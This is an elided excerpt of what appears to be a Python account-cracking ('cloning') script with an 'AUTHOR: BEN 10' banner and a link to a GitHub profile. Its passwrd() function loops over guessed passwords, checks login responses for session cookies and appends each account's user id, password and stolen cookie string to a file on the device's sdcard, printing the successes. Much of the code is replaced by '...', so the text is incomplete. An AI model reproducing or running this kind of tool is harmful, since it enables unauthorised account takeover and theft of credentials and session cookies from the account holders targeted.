...
\033[1;37m[\033[1;32m━\033[1;37m] AUTHOR   : \033[1;32mBEN 10       
...
os.system('xdg-open https://www.github.com/toufik-404')
...
def passwrd():
    ...
    print("\033[1;97m[+] \033[1;97mCLONING SPEED FAST")
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                open('/sdcard/Toufik-Ok.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
                break
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[1;32m[{time.strftime("%H:%M")}•Toufik-OK] {idf} • {pw} ')
